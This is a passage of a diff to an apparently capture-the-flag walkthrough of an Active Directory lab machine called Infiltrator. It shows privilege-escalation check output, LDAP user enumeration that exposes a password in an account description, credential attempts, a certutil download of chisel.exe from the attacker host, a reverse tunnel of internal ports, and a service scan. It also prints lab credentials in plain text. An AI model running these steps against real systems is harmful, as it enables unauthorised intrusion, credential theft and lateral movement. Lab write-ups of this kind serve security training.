+┃ Process Light (PPL) and thus can only be accessed by other   ┃
+┃ protected processes with an equivalent or higher protection  ┃
+┃ level.                                                       ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] Status: Vulnerable - Low
+
+
+Key         : HKLM\SYSTEM\CurrentControlSet\Control\Lsa
+Value       : RunAsPPL
+Data        : (null)
+Description : LSA Protection is not enabled.
+
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0006 - Credential Access                        ┃
+┃ NAME     ┃ Credential Guard                                  ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether Credential Guard is supported and enabled.     ┃
+┃ Note that when Credential Guard is enabled, credentials are  ┃
+┃ stored in an isolated process ('LsaIso.exe') that cannot be  ┃
+┃ accessed, even if the kernel is compromised.                 ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] Status: Informational (not vulnerable)
+
+
+SecurityServicesConfigured  : (null)
+SecurityServicesRunning     : (null)
+SecurityServicesDescription : Credential Guard is not supported.
+LsaCfgFlagsPolicyKey        : HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard
+LsaCfgFlagsPolicyValue      : LsaCfgFlags
+LsaCfgFlagsPolicyData       : (null)
+LsaCfgFlagsKey              : HKLM\SYSTEM\CurrentControlSet\Control\LSA
+LsaCfgFlagsValue            : LsaCfgFlags
+LsaCfgFlagsData             : (null)
+LsaCfgFlagsDescription      : Credential Guard is not configured.
+
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0008 - Lateral Movement                         ┃
+┃ NAME     ┃ LAPS                                              ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether LAPS is configured and enabled. Note that this ┃
+┃ applies to domain-joined machines only.                      ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] Status: Vulnerable - Medium
+
+
+Policy      : Enable local admin password management (LAPS legacy)
+Key         : HKLM\Software\Policies\Microsoft Services\AdmPwd
+Default     : 0
+Value       : (null)
+Description : The local administrator password is not managed (default).
+
+Policy      : LAPS > Configure password backup directory
+Key         : HKLM\Software\Microsoft\Policies\LAPS
+Default     : 0
+Value       : (null)
+Description : The local administrator password is not backed up (default).
+
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0001 - Initial Access                           ┃
+┃ NAME     ┃ BitLocker configuration                           ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether BitLocker is enabled on the system drive and   ┃
+┃ requires a second factor of authentication (PIN or startup   ┃
+┃ key). Note that this check might yield a false positive if a ┃
+┃ third-party drive encryption software is installed.          ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+Warning: TpmGetDeviceInformation KO 0x8028400F
+[*] Status: Informational (not vulnerable)
+
+
+MachineRole : Domain Controller
+TpmPresent  :
+Description : Not a workstation, BitLocker configuration is irrelevant.
+
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ PATH folder permissions                           ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether the current user has any write permissions on  ┃
+┃ the system-wide PATH folders. If so, the system could be     ┃
+┃ vulnerable to privilege escalation through ghost DLL         ┃
+┃ hijacking.                                                   ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] Status: Informational (not vulnerable)
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ Known ghost DLLs                                  ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Get information about services that are known to be prone to ┃
+┃ ghost DLL hijacking. Note that their exploitation requires   ┃
+┃ the current user to have write permissions on at least one   ┃
+┃ system-wide PATH folder.                                     ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] Status: Informational
+
+
+Name           : cdpsgshims.dll
+Description    : Loaded by the Connected Devices Platform Service (CDPSvc) upon startup.
+RunAs          : NT AUTHORITY\LocalService
+RebootRequired : True
+Link           : https://nafiez.github.io/security/eop/2019/11/05/windows-service-host-process-eop.html
+
+Name           : WptsExtensions.dll
+Description    : Loaded by the Task Scheduler service (Schedule) upon startup.
+RunAs          : LocalSystem
+RebootRequired : True
+Link           : http://remoteawesomethoughts.blogspot.com/2019/05/windows-10-task-schedulerservice.html
+
+Name           : SprintCSP.dll
+Description    : Loaded by the Storage Service (StorSvc) when the RPC procedure 'SvcRebootToFlashingMode' is invoked.
+RunAs          : LocalSystem
+RebootRequired : False
+Link           : https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc
+
+Name           : wlanapi.dll
+Description    : Loaded by the Network Connections service (NetMan) when listing network interfaces.
+RunAs          : LocalSystem
+RebootRequired : False
+Link           : https://itm4n.github.io/windows-server-netman-dll-hijacking/
+
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ AlwaysInstallElevated                             ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether the 'AlwaysInstallElevated' policy is enabled  ┃
+┃ system-wide and for the current user. If so, the current     ┃
+┃ user may install a Windows Installer package with elevated   ┃
+┃ (SYSTEM) privileges.                                         ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] Status: Informational (not vulnerable)
+
+
+LocalMachineKey   : HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+LocalMachineValue : AlwaysInstallElevated
+LocalMachineData  : (null)
+Description       : AlwaysInstallElevated is not enabled in HKLM.
+
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0008 - Lateral Movement                         ┃
+┃ NAME     ┃ WSUS configuration                                ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether WSUS uses the HTTPS protocol to retrieve       ┃
+┃ updates from the on-premise update server. If WSUS uses the  ┃
+┃ clear-text HTTP protocol, it is vulnerable to MitM attacks   ┃
+┃ that may result in remote code execution as SYSTEM.          ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] Status: Informational (not vulnerable)
+
+
+Key         : HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate
+Value       : WUServer
+Data        : (null)
+Description : No WSUS server is configured (default).
+
+Key         : HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU
+Value       : UseWUServer
+Data        : (null)
+Description : WSUS server not enabled (default).
+
+Key         : HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate
+Value       : SetProxyBehaviorForUpdateDetection
+Data        : (null)
+Description : Proxy fallback not configured (default).
+
+Key         : HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate
+Value       : DisableWindowsUpdateAccess
+Data        : (null)
+Description : Windows Update features are enabled (default).
+
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0008 - Lateral Movement                         ┃
+┃ NAME     ┃ Hardened UNC paths                                ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether sensitive UNC paths are properly hardened.     ┃
+┃ Note that non-hardened UNC paths used for retrieving group   ┃
+┃ policies can be hijacked through an MitM attack to obtain    ┃
+┃ remote code execution as SYSTEM.                             ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] Status: Informational (not vulnerable)
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ Point and Print configuration                     ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether the Print Spooler service is enabled and if    ┃
+┃ the Point and Print configuration allows non-administrator   ┃
+┃ users to install printer drivers.                            ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] Status: Informational (not vulnerable)
+
+
+Description : The Print Spooler service is disabled.
+
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ COM server registry permissions                   ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether the current user has any modification rights   ┃
+┃ on a COM server in the registry. This may not necessarily    ┃
+┃ result in a privilege escalation. Further analysis is        ┃
+┃ required.                                                    ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] Status: Informational (not vulnerable)
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ COM server image file permissions                 ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether the current user has any modification rights   ┃
+┃ on a COM server module file. This may not necessarily result ┃
+┃ in a privilege escalation. Further analysis is required.     ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] Status: Informational (not vulnerable)
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ COM server ghost DLLs                             ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether there are COM servers registered with a        ┃
+┃ non-existent module using a relative path. This may not      ┃
+┃ necessarily result in a privilege escalation. You would also ┃
+┃ need to have rights to create files in a PATH folder.        ┃
+┃ Further analysis is required.                                ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
 </details>
 
-Nothing much found except for `Output Messenger` in `PATH` and `INSTALLED SOFTWARE`
+Interesting software found: `Output Messenger`
 
 ```
-Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Program Files\Output Messenger Server\Plugins\Output\apache2\bin\;C:\Program Files\Output Messenger Server\Plugins\Output\php\;C:\Program Files\Output Messenger Server\Plugins\Output\mysql\bin\;C:\Users\M.harris\AppData\Local\Microsoft\WindowsApps
-⋮
- [+] INSTALLED SOFTWARE
-⋮
-    InstallLocation    REG_SZ    C:\Program Files\Output Messenger Server\
-    InstallLocation    REG_SZ    C:\Program Files\Output Messenger\
-    InstallLocation    REG_SZ    C:\Program Files\VMware\VMware Tools\
+Name        : OutputMessengerApache
+DisplayName : Output Messenger - Apache
+ImagePath   : "C:\Program Files\Output Messenger Server\Plugins\Output\apache2\bin\outputmessenger_httpd.exe" -k runservice
+User        : LocalSystem
+StartMode   : Automatic
+
+Name        : OutputMessengerMySQL
+DisplayName : Output Messenger - MySQL
+ImagePath   : "C:\Program Files\Output Messenger Server\Plugins\Output\mysql\bin\outputmessenger_mysqld.exe" "--defaults-file=C:\Program Files\Output Messenger Server\Plugins\Output\mysql\my.ini" "OutputMessengerMySQL"
+User        : LocalSystem
+StartMode   : Automatic
+
+Name        : OutputMessengerServer
+DisplayName : Output Messenger Server
+ImagePath   : "C:\Program Files\Output Messenger Server\OMServerService.exe"
+User        : LocalSystem
+StartMode   : Automatic
 ```
 
-Search for `*OutputMessenger*` reveals a config file:
+### 6.2. Finding another way
+
+The PrivescCheck didn't reveal much, let's go check the users again
+
+```console
+root@kali:~# netexec ldap infiltrator.htb -u l.clark -p 'WAT?watismypass!' --users
+SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
+LDAP        10.10.11.31     389    DC01             [+] infiltrator.htb\l.clark:WAT?watismypass!
+LDAP        10.10.11.31     389    DC01             [*] Enumerated 12 domain users: infiltrator.htb
+LDAP        10.10.11.31     389    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-
+LDAP        10.10.11.31     389    DC01             Administrator                 2024-08-21 19:58:28 0       Built-in account for administering the computer/domain
+LDAP        10.10.11.31     389    DC01             Guest                         <never>             1       Built-in account for guest access to the computer/domain
+LDAP        10.10.11.31     389    DC01             krbtgt                        2023-12-04 17:36:16 1       Key Distribution Center Service Account
+LDAP        10.10.11.31     389    DC01             D.anderson                    2023-12-04 18:56:02 0
+LDAP        10.10.11.31     389    DC01             L.clark                       2023-12-04 19:04:24 0
+LDAP        10.10.11.31     389    DC01             M.harris                      2024-12-26 13:21:41 0
+LDAP        10.10.11.31     389    DC01             O.martinez                    2024-02-25 15:41:03 0
+LDAP        10.10.11.31     389    DC01             A.walker                      2023-12-05 22:06:28 1
+LDAP        10.10.11.31     389    DC01             K.turner                      2024-02-25 15:40:35 3       MessengerApp@Pass!
+LDAP        10.10.11.31     389    DC01             E.rodriguez                   2024-12-26 13:21:41 0
+LDAP        10.10.11.31     389    DC01             winrm_svc                     2024-08-02 22:42:45 0
+LDAP        10.10.11.31     389    DC01             lan_managment                 2024-08-02 22:42:46 0
+```
+
+It seems account `K.turner` has a rather cryptic description `MessengerApp@Pass!`
+
+It doesn't seem feasible to login with `k.turner`/`MessengerApp@Pass!`
+
+```console
+root@kali:~# crackmapexec smb dc01.infiltrator.htb -u k.turner -p 'MessengerApp@Pass!' -d infiltrator.htb
+SMB         dc01.infiltrator.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
+SMB         dc01.infiltrator.htb 445    DC01             [-] infiltrator.htb\k.turner:MessengerApp@Pass! STATUS_LOGON_FAILURE
+```
+
+Let's go back to `m.harris`'s session and try [RunasCs](https://github.com/antonioCoco/RunasCs)
+
+Prepare RunasCs in Kali:
+
+```sh
+VERSION=$(curl -sI https://github.com/antonioCoco/RunasCs/releases/latest | grep location: | cut -d / -f 8 | tr -d '\r' | tr -d 'v')
+curl -sLO https://github.com/antonioCoco/RunasCs/releases/download/v$VERSION/RunasCs.zip
+unzip RunasCs.zip
+mv RunasCs.exe /var/www/html
+```
+
+Try to RunasCs with `k.turner`/`MessengerApp@Pass!` (fail):
+
+``` cmd
+*Evil-WinRM* PS C:\Users\M.harris\Documents> .\RunasCs.exe k.turner MessengerApp@Pass! whoami
+[-] RunasCsException: LogonUser failed with error code: The user name or password is incorrect
+```
+
+Let's see what ports are the target listening on
 
 ```cmd
-*Evil-WinRM* PS C:\Users\M.harris\Documents> Get-ChildItem -Path C:\ -Filter *OutputMessenger* -Recurse -ErrorAction SilentlyContinue -Force
-
-
-    Directory: C:\Program Files\Output Messenger
-
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
--a----       10/23/2023   1:41 PM        6826240 OutputMessenger.exe
--a----       12/19/2022  11:07 AM           1788 OutputMessenger.exe.config
+*Evil-WinRM* PS C:\Users\M.harris\Documents> netstat -ano | findstr LISTENING
+  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       624
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       892
+  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       624
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       624
+  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       892
+  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       624
+  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       624
+  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       624
+  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       64
+  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       2368
+  TCP    0.0.0.0:14118          0.0.0.0:0              LISTENING       7628
+  TCP    0.0.0.0:14119          0.0.0.0:0              LISTENING       7628
+  TCP    0.0.0.0:14121          0.0.0.0:0              LISTENING       7628
+  TCP    0.0.0.0:14122          0.0.0.0:0              LISTENING       7628
+  TCP    0.0.0.0:14123          0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:14125          0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:14126          0.0.0.0:0              LISTENING       6092
+  TCP    0.0.0.0:14127          0.0.0.0:0              LISTENING       7628
+  TCP    0.0.0.0:14128          0.0.0.0:0              LISTENING       7628
+  TCP    0.0.0.0:14130          0.0.0.0:0              LISTENING       7628
+  TCP    0.0.0.0:14406          0.0.0.0:0              LISTENING       7392
+  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       496
+  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1272
+  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1644
+  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       624
+  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       2256
+  TCP    0.0.0.0:49690          0.0.0.0:0              LISTENING       624
+  TCP    0.0.0.0:49691          0.0.0.0:0              LISTENING       624
+  TCP    0.0.0.0:49694          0.0.0.0:0              LISTENING       624
+  TCP    0.0.0.0:49709          0.0.0.0:0              LISTENING       616
+  TCP    0.0.0.0:49722          0.0.0.0:0              LISTENING       2168
+  TCP    0.0.0.0:49735          0.0.0.0:0              LISTENING       1640
+  TCP    0.0.0.0:50024          0.0.0.0:0              LISTENING       2812
 ⋮
 ```
 
-Contents of `OutputMessenger.exe.config` 
-
-```xml
-<?xml version="1.0" encoding="utf-8"?>
-<configuration>
-  <configSections>
-    <section name="entityFramework" type="System.Data.Entity.Internal.ConfigFile.EntityFrameworkSection, EntityFramework, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" requirePermission="false"/>
-  </configSections>
-  <runtime>
-    <legacyCorruptedStateExceptionsPolicy enabled="false"/>
-  </runtime>
-  <startup useLegacyV2RuntimeActivationPolicy="true">
-    <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.0"/>
-  </startup>
-  <system.data>
-    <DbProviderFactories>
-      <clear/>
-      <remove invariant="System.Data.SQLite"/>
-      <add name="SQLite Data Provider" invariant="System.Data.SQLite" description="Data Provider for SQLite" type="System.Data.SQLite.SQLiteFactory, System.Data.SQLite"/>
-      <remove invariant="System.Data.SQLite.EF6"/>
-      <add name="SQLite Data Provider (Entity Framework 6)" invariant="System.Data.SQLite.EF6" description=".NET Framework Data Provider for SQLite (Entity Framework 6)" type="System.Data.SQLite.EF6.SQLiteProviderFactory, System.Data.SQLite.EF6"/>
-    </DbProviderFactories>
-  </system.data>
-  <entityFramework>
-    <defaultConnectionFactory type="System.Data.Entity.Infrastructure.SqlConnectionFactory, EntityFramework"/>
-    <providers>
-      <provider invariantName="System.Data.SqlClient" type="System.Data.Entity.SqlServer.SqlProviderServices, EntityFramework.SqlServer"/>
-      <provider invariantName="System.Data.SQLite" type="System.Data.SQLite.EF6.SQLiteProviderServices, System.Data.SQLite.EF6"/>
-      <provider invariantName="System.Data.SQLite.EF6" type="System.Data.SQLite.EF6.SQLiteProviderServices, System.Data.SQLite.EF6" />
-    </providers>
-  </entityFramework>
-</configuration>
-```
-
-### 6.2. Connecting to MySQL on target
-
-> [!Note]
->
-> There's supposed to be a `C:\ProgramData\Output Messenger Server\Temp\OutputMessengerMysql.zip` file that contains `OutputMysql.ini` with MySQL root credentials
->
-> ```
-> [SETTINGS]
-> SQLPort=14406
-> Version=1.0.0
-> 
-> [DBCONFIG]
-> DBUsername=root
-> DBPassword=ibWijteig5
-> DBName=outputwall
-> 
-> [PATHCONFIG]
-> ;mysql5.6.17
-> MySQL=mysql
-> Log=log
-> def_conf=settings
-> MySQL_data=data
-> Backup=backup
-> ```
-
-#### 6.2.1. Prepare Chisel
+#### 6.2.1. Establish Chisel connection
 
 Start chisel listener on Kali
 
@@ -1275,38 +1595,175 @@ gzip -d chisel_${VERSION}_windows_amd64.gz
 mv chisel_${VERSION}_windows_amd64 /var/www/html/chisel.exe
 ```
 
-#### 6.2.2. Establish Chisel connection
-
 On Target:
 
 ```cmd
-*Evil-WinRM* PS C:\Users\M.harris\Documents> certutil.exe -urlcache -f -split http://10.10.14.35/chisel.exe .\chisel.exe
+*Evil-WinRM* PS C:\Users\M.harris\Documents> certutil.exe -urlcache -f -split http://10.10.14.35/chisel.exe
 ****  Online  ****
   000000  ...
   94f000
 CertUtil: -URLCache command completed successfully.
-*Evil-WinRM* PS C:\Users\M.harris\Documents> .\chisel.exe client 10.10.14.35:8080 R:14406:127.0.0.1:14406
-chisel.exe : 2024/12/26 00:26:23 client: Connecting to ws://10.10.14.35:8080
-    + CategoryInfo          : NotSpecified: (2024/12/26 00:2...0.10.14.35:8080:String) [], RemoteException
+*Evil-WinRM* PS C:\Users\M.harris\Documents> .\chisel.exe client 10.10.14.35:8080 R:14118:127.0.0.1:14118 R:14119:127.0.0.1:14119 R:14121:127.0.0.1:14121 R:14122:127.0.0.1:14122 R:14123:127.0.0.1:14123 R:14125:127.0.0.1:14125 R:14126:127.0.0.1:14126 R:14127:127.0.0.1:14127 R:14128:127.0.0.1:14128 R:14130:127.0.0.1:14130 R:14406:127.0.0.1:14406
+chisel.exe : 2024/12/26 06:06:17 client: Connecting to ws://10.10.14.35:8080
+    + CategoryInfo          : NotSpecified: (2024/12/26 06:0...0.10.14.35:8080:String) [], RemoteException
     + FullyQualifiedErrorId : NativeCommandError
-2024/12/26 00:26:23 client: Connected (Latency 5.7683ms)
+2024/12/26 06:06:17 client: Connected (Latency 5.6289ms)
 ```
 
 Kali should show connected:
 
 ```
-2024/12/26 16:26:23 server: session#1: Client version (1.10.1) differs from server version (1.10.1-0kali1)
-2024/12/26 16:26:23 server: session#1: tun: proxy#R:14406=>14406: Listening
+2024/12/26 22:06:17 server: session#1: Client version (1.10.1) differs from server version (1.10.1-0kali1)
+2024/12/26 22:06:17 server: session#1: tun: proxy#R:14118=>14118: Listening
+2024/12/26 22:06:17 server: session#1: tun: proxy#R:14119=>14119: Listening
+2024/12/26 22:06:17 server: session#1: tun: proxy#R:14121=>14121: Listening
+2024/12/26 22:06:17 server: session#1: tun: proxy#R:14122=>14122: Listening
+2024/12/26 22:06:17 server: session#1: tun: proxy#R:14123=>14123: Listening
+2024/12/26 22:06:17 server: session#1: tun: proxy#R:14125=>14125: Listening
+2024/12/26 22:06:17 server: session#1: tun: proxy#R:14126=>14126: Listening
+2024/12/26 22:06:17 server: session#1: tun: proxy#R:14127=>14127: Listening
+2024/12/26 22:06:17 server: session#1: tun: proxy#R:14128=>14128: Listening
+2024/12/26 22:06:17 server: session#1: tun: proxy#R:14130=>14130: Listening
+2024/12/26 22:06:17 server: session#1: tun: proxy#R:14406=>14406: Listening
 ```
 
-#### 6.2.3. Connect to MySQL
+Do a nmap scan on the mapped ports:
 
-Connect using the `ibWijteig5` password
+```console
+root@kali:~# nmap -Pn -p 14118,14119,14121,14122,14123,14125,14126,14127,14128,14130,14406 -A 127.0.0.1
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-26 22:07 +08
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.000078s latency).
 
-```sh
-root@kali:~# mysql -h 127.0.0.1 -P 14406  --skip-ssl -u root -p
-Enter password:
-ERROR 1045 (28000): Access denied for user 'root'@'localhost' (using password: YES)
+PORT      STATE SERVICE     VERSION
+14118/tcp open  ssl/unknown
+| ssl-cert: Subject: commonName=Output Messenger/organizationName=Srimax/stateOrProvinceName=Tamil Nadu/countryName=IN
+| Not valid before: 2016-04-14T10:22:17
+|_Not valid after:  2066-04-02T10:22:17
+| fingerprint-strings:
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe:
+|_    Ouput Messenger Server - Switching Server V2.0.42.0
+|_ssl-date: 2024-12-26T14:11:54+00:00; -1s from scanner time.
+14119/tcp open  ssl/unknown
+| ssl-cert: Subject: commonName=Output Messenger/organizationName=Srimax/stateOrProvinceName=Tamil Nadu/countryName=IN
+| Not valid before: 2016-04-14T10:22:17
+|_Not valid after:  2066-04-02T10:22:17
+|_ssl-date: 2024-12-26T14:11:54+00:00; -1s from scanner time.
+14121/tcp open  unknown
+14122/tcp open  unknown
+| fingerprint-strings:
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe:
+|_    Ouput Messenger Server - Switching Server V2.0.42.0
+14123/tcp open  http        Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+| http-title: Output Messenger
+|_Requested resource was http://localhost:14123/ombro/index.html
+14125/tcp open  http        Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Site doesn't have a title (application/json; charset=utf-8).
+|_http-server-header: Microsoft-HTTPAPI/2.0
+14126/tcp open  http        Apache httpd 2.4.9 ((Win32) PHP/5.5.12)
+|_http-title: Index of /
+|_http-server-header: Apache/2.4.9 (Win32) PHP/5.5.12
+| http-methods:
+|_  Potentially risky methods: TRACE
+14127/tcp open  unknown
+14128/tcp open  unknown
+14130/tcp open  unknown
+14406/tcp open  mysql       MySQL 5.5.5-10.1.19-MariaDB
+| mysql-info:
+|   Protocol: 10
+|   Version: 5.5.5-10.1.19-MariaDB
+|   Thread ID: 5
+|   Capabilities flags: 63487
+|   Some Capabilities: Support41Auth, SupportsTransactions, FoundRows, ConnectWithDatabase, LongColumnFlag, DontAllowDatabaseTableColumn, Speaks41ProtocolOld, SupportsCompression, ODBCClient, LongPassword, IgnoreSigpipes, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, InteractiveClient, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
+|   Status: Autocommit
+|   Salt: M?4'dFmu%QLiM$jl_vT"
+|_  Auth Plugin Name: mysql_native_password
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port14118-TCP:V=7.94SVN%T=SSL%I=7%D=12/26%Time=676D635A%P=x86_64-pc-lin
+SF:ux-gnu%r(GenericLines,33,"Ouput\x20Messenger\x20Server\x20-\x20Switchin
+SF:g\x20Server\x20V2\.0\.42\.0")%r(GetRequest,33,"Ouput\x20Messenger\x20Se
